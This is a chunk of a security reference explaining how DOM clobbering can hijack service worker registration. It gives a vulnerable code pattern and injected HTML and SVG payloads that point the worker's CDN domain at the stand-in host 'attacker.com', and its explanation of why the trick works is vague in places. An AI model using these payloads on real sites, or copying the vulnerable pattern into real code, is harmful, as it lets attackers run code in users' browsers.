---
source: "languages/javascript/service-worker-attacks.md"
title: "Service Worker Hijacking and Attacks"
category: "language-vuln"
language: "javascript"
chunk: 4
total_chunks: 10
heading: "Attack Vector 2: DOM Clobbering → Service Worker Hijack"
---

## Attack Vector 2: DOM Clobbering → Service Worker Hijack

**Source:** https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering

### The Vulnerability

Combining DOM Clobbering with Service Worker registration creates a powerful attack chain. If a page passes data to a SW via DOM elements (e.g., hidden `<div>` elements), an attacker who can inject HTML can clobber those elements.

### Vulnerable Pattern

```javascript
// Page code that passes config to service worker via DOM
// HTML:
// <div id="cdnDomain" style="display:none">cdn.example.com</div>

// JavaScript:
const domain = document.getElementById('cdnDomain').innerText;
navigator.serviceWorker.register(`/sw.js?cdnDomain=${domain}`);
```

### The DOM Clobbering Trick

The attacker injects HTML that clobbers `document.getElementById('cdnDomain')`:

```html
<!-- Attacker injects BEFORE the legitimate div -->
<html id="cdnDomain" style="display:none">attacker.com</html>

<!-- The legitimate div is now shadowed -->
<div id="cdnDomain" style="display:none">cdn.example.com</div>

<script>
  // document.getElementById('cdnDomain') returns the <html> element
  // innerText retrieves "attacker.com"
  const domain = document.getElementById('cdnDomain').innerText; // "attacker.com"
  navigator.serviceWorker.register(`/sw.js?cdnDomain=${domain}`);
  // SW now loads from attacker.com!
</script>
```

### Why `<html>` Works

The `getElementById()` function returns the **first** element with the matching `id` in the document. However, `document.getElementById(id)` can be tricked: if an `<html>` or `<body>` element has the same `id`, some browsers prioritize them differently.

### SVG-based Clobbering

```html
<!-- Also works inside SVG foreignObject -->
<div style="display:none" id="cdnDomain">cdn.example.com</div>
<svg>
  <foreignobject>
    <body id="cdnDomain" style="display:block">attacker.com</body>
  </foreignobject>
</svg>
<script>
  alert(document.getElementById('cdnDomain').innerText); // "attacker.com"
</script>
```

---